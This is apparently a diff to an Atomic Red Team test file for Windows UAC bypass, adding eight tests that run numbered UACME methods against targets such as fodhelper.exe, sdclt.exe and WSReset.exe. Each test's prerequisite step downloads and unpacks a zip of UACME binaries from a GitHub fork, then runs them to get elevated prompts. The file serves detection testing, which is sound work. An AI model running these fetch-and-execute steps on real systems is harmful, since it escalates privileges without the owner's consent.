@@ -11,7 +11,7 @@ atomic_tests:
   input_arguments:
     executable_binary:
       description: Binary to execute with UAC Bypass
-      type: path
+      type: Path
       default: C:\Windows\System32\cmd.exe
   executor:
     command: |
@@ -30,7 +30,7 @@ atomic_tests:
   input_arguments:
     executable_binary:
       description: Binary to execute with UAC Bypass
-      type: path
+      type: Path
       default: C:\Windows\System32\cmd.exe
   executor:
     command: |
@@ -50,7 +50,7 @@ atomic_tests:
   input_arguments:
     executable_binary:
       description: Binary to execute with UAC Bypass
-      type: path
+      type: Path
       default: C:\Windows\System32\cmd.exe
   executor:
     command: |
@@ -70,7 +70,7 @@ atomic_tests:
   input_arguments:
     executable_binary:
       description: Binary to execute with UAC Bypass
-      type: path
+      type: Path
       default: C:\Windows\System32\cmd.exe
   executor:
     command: |
@@ -91,7 +91,7 @@ atomic_tests:
   input_arguments:
     executable_binary:
       description: Binary to execute with UAC Bypass
-      type: path
+      type: Path
       default: C:\Windows\System32\cmd.exe
   executor:
     command: |
@@ -113,7 +113,7 @@ atomic_tests:
   input_arguments:
     executable_binary:
       description: Binary to execute with UAC Bypass
-      type: path
+      type: Path
       default: C:\Windows\System32\cmd.exe
   executor:
     command: |
@@ -137,7 +137,7 @@ atomic_tests:
   input_arguments:
     command.to.execute:
       description: Command to execute
-      type: string
+      type: String
       default: cmd.exe /c notepad.exe
   executor:
     command: |
@@ -188,3 +188,371 @@ atomic_tests:
       #{file_path}
     name: command_prompt
     elevation_required: false
+- name: UACME Bypass Method 23
+  auto_generated_guid: 8ceab7a2-563a-47d2-b5ba-0995211128d7
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: Leo Davidson derivative
+    
+    Type:	Dll Hijack
+    
+    Method: IFileOperation
+    
+    Target:	\system32\pkgmgr.exe
+    
+    Component: DismCore.dll
+    
+    Implementation:	ucmDismMethod
+    
+    UCM Method:	UacMethodDISM
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\23 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
+- name: UACME Bypass Method 31
+  auto_generated_guid: b0f76240-9f33-4d34-90e8-3a7d501beb15
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: Enigma0x3
+    
+    Type:	Shell API
+    
+    Method: Registry key manipulation
+    
+    Target:	\system32\sdclt.exe
+    
+    Component: Attacker defined
+    
+    Implementation:	ucmSdcltIsolatedCommandMethod
+    
+    UCM Method:	UacMethodShellSdclt
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\31 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
+- name: UACME Bypass Method 33
+  auto_generated_guid: e514bb03-f71c-4b22-9092-9f961ec6fb03
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: winscripting.blog
+    
+    Type:	Shell API
+    
+    Method: Registry key manipulation
+    
+    Target:	\system32\fodhelper.exe
+    
+    Component:	Attacker defined
+    
+    Implementation:	ucmShellRegModMethod
+    
+    UCM Method:	UacMethodMsSettings2
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\33 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
+- name: UACME Bypass Method 34
+  auto_generated_guid: 695b2dac-423e-448e-b6ef-5b88e93011d6
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: James Forshaw
+    
+    Type:	Shell API
+    
+    Method: Environment variables expansion
+    
+    Target:	\system32\svchost.exe via \system32\schtasks.exe
+    
+    Component:	Attacker defined
+    
+    Implementation:	ucmDiskCleanupEnvironmentVariable
+    
+    UCM Method:	UacMethodDiskSilentCleanup
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\34 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
+- name: UACME Bypass Method 39
+  auto_generated_guid: 56163687-081f-47da-bb9c-7b231c5585cf
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: Stefan Kanthak
+    
+    Type:	Dll Hijack
+    
+    Method: .NET Code Profiler
+    
+    Target:	\system32\mmc.exe
+    
+    Component:	Attacker defined
+    
+    Implementation:	ucmCorProfilerMethod
+    
+    UCM Method:	UacMethodCorProfiler
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\39 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
+- name: UACME Bypass Method 56
+  auto_generated_guid: 235ec031-cd2d-465d-a7ae-68bab281e80e
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: Hashim Jawad
+    
+    Type:	Shell API
+    
+    Method: Registry key manipulation
+    
+    Target:	\system32\WSReset.exe
+    
+    Component:	Attacker defined
+    
+    Implementation:	ucmShellRegModMethod
+    
+    UCM Method:	UacMethodShellWSReset
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\56 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
+- name: UACME Bypass Method 59
+  auto_generated_guid: dfb1b667-4bb8-4a63-a85e-29936ea75f29
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: James Forshaw
+    
+    Type:	AppInfo ALPC
+    
+    Method: RAiLaunchAdminProcess and DebugObject
+    
+    Target:	Attacker defined
+    
+    Component:	Attacker defined
+    
+    Implementation:	ucmDebugObjectMethod
+    
+    UCM Method:	UacMethodDebugObject
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\59 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
+- name: UACME Bypass Method 61
+  auto_generated_guid: 7825b576-744c-4555-856d-caf3460dc236
+  description: |
+    Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
+    Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.
+    
+    Author: Enigma0x3/bytecode77 derivative by Nassim Asrir
+    
+    Type:	Shell API
+    
+    Method: Registry key manipulation
+    
+    Target:	\system32\slui.exe, \system32\changepk.exe
+    
+    Component:	Attacker defined
+    
+    Implementation:	ucmShellRegModMethod
+    
+    UCM Method:	UacMethodDebugObject
+    
+    https://github.com/hfiref0x/UACME
+  supported_platforms:
+  - windows
+  input_arguments:
+    uacme_exe:
+      description: Path to uacme executable
+      type: Path
+      default: '%temp%\uacme\61 Akagi64.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      UACME executable must exist on disk at specified location (#{uacme_exe})
+    prereq_command: |
+      $tempPath = cmd /c echo #{uacme_exe}
+      if (Test-Path "$tempPath") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+      Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+      Remove-Item $env:TEMP\uacme.zip -Force
+  executor:
+    command: |
+      "#{uacme_exe}"
+    cleanup_command: |
+      powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+      powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+    name: command_prompt
